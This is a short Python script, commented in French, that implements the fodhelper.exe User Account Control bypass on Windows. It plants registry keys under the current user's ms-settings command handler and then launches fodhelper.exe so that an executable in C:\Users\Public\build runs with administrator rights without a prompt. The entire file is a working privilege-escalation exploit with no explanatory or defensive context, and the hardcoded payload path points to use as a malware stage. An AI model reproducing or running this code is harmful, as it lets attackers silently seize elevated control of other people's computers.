import os
import sys
import ctypes
import winreg

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
REG_PATH              = r'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    '''
    Vérifie si le script est lancé avec les droits d'administrateurs.
    Retourne True s'il est lancé en admin, False sinon.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_reg_key(key, value):
    '''
    Création une clé de registre
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def bypass_uac(cmd):
    '''
    Créer les 2 clés de registre nécessaires pour outrepasser l'UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def execute():        
    if not is_running_as_admin():
        try:          
            current_dir = 'C:\\Users\\Public\\build\\exe.win-amd64-3.6\\boot.exe'
            cmd = '{} /c {}'.format(CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)
            sys.exit(0)                
        except WindowsError:
            sys.exit(1) 

if __name__ == '__main__':
    execute()